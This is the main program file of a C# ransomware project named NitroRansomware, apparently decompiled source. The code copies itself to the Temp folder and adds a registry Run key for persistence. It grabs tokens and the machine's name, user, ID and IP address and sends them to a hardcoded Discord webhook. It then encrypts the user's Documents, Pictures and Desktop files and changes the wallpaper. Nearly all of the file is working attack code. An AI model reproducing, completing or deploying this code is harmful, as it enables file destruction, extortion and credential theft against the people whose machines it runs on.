using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace NitroRansomware;

internal class Program
{
	private static string desktop = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);

	private static string documents = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

	private static string pictures = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);

	public static string WEBHOOK = "https://discord.com/api/webhooks/832936790720774155/rQXXpVRvcftBfWBwAIIs6qaYiKQPOF4Y2XjDNGBeims6wUWpcxpEoo58IcwDSIHtljaQ";

	public static string DECRYPT_PASSWORD = "Aliveissupercoolthanks";

	private static Logs logging = new Logs("DEBUG", 0);

	private static Webhook ww = new Webhook(WEBHOOK);

	private static void Main(string[] args)
	{
		if (Installed())
		{
			Application.Run((Form)(object)new Form1());
			return;
		}
		Duplicate();
		StartUp();
		Setup();
		EncryptAll();
		Temp();
		Thread.Sleep(6000);
		Application.Run((Form)(object)new Form1());
	}

	private static void Setup()
	{
		logging.Debug("Setup start");
		List<string> list = Grabber.Grab();
		string text = "";
		foreach (string item in list)
		{
			text = text + item + "\n";
		}
		Console.WriteLine(text);
		List<string> details = User.GetDetails();
		string identifier = User.GetIdentifier();
		string iP = User.GetIP();
		Webhook webhook = new Webhook(WEBHOOK);
		webhook.Send("**Program executed** ```Status: Active \nPC Name: " + details[0] + "\nUser:" + details[1] + "\nUUID: " + identifier + "\nIP Address: " + iP + "```");
		webhook.Send("```Decryption Key: " + DECRYPT_PASSWORD + "```");
		webhook.Send("```Tokens:\n" + text + "```");
	}

	public static void EncryptAll()
	{
		ww.Send("```Starting file encryption..```");
		Thread thread = new Thread((ThreadStart)delegate
		{
			Crypto.EncryptContent(documents);
		});
		Thread thread2 = new Thread((ThreadStart)delegate
		{
			Crypto.EncryptContent(pictures);
		});
		Thread thread3 = new Thread((ThreadStart)delegate
		{
			Crypto.EncryptContent(desktop);
		});
		thread.Start();
		thread2.Start();
		thread3.Start();
		thread.Join();
		thread2.Join();
		thread3.Join();
		ww.Send($"```Finished encrypting victim's files. Total number of files encrypted: {Crypto.encryptedFileLog.Count}```");
		Wallpaper.ChangeWallpaper();
	}

	public static void DecryptAll()
	{
		Thread thread = new Thread((ThreadStart)delegate
		{
			Crypto.DecryptContent(documents);
		});
		Thread thread2 = new Thread((ThreadStart)delegate
		{
			Crypto.DecryptContent(pictures);
		});
		Thread thread3 = new Thread((ThreadStart)delegate
		{
			Crypto.DecryptContent(desktop);
		});
		thread.Start();
		thread2.Start();
		thread3.Start();
		thread.Join();
		thread2.Join();
		thread3.Join();
	}

	private static void StartUp()
	{
		try
		{
			string text = Process.GetCurrentProcess().ProcessName + ".exe";
			string text2 = Path.GetTempPath() + text;
			Console.WriteLine(text2);
			using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("NR", "\"" + text2 + "\"");
		}
		catch (Exception ex)
		{
			logging.Error(ex.Message);
		}
	}

	public static void RemoveStart()
	{
		if (Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", "NR", true) != null)
		{
			using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true))
			{
				registryKey.DeleteValue("NR", throwOnMissingValue: false);
			}
		}
	}

	private static void Duplicate()
	{
		try
		{
			string text = Process.GetCurrentProcess().ProcessName + ".exe";
			string sourceFileName = Path.Combine(Environment.CurrentDirectory, text);
			File.Copy(sourceFileName, Path.GetTempPath() + text);
			Console.WriteLine(Path.GetTempPath());
		}
		catch (Exception ex)
		{
			logging.Debug(ex.Message);
		}
	}

	private static bool Installed()
	{
		if (Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", "NR", null) != null)
		{
			return true;
		}
		return false;
	}

	private static void Temp()
	{
		string text = Path.GetTempPath() + "NR_decrypt.txt";
		Console.WriteLine(text);
		using StreamWriter streamWriter = new StreamWriter(text);
		streamWriter.WriteLine(DECRYPT_PASSWORD);
	}
}
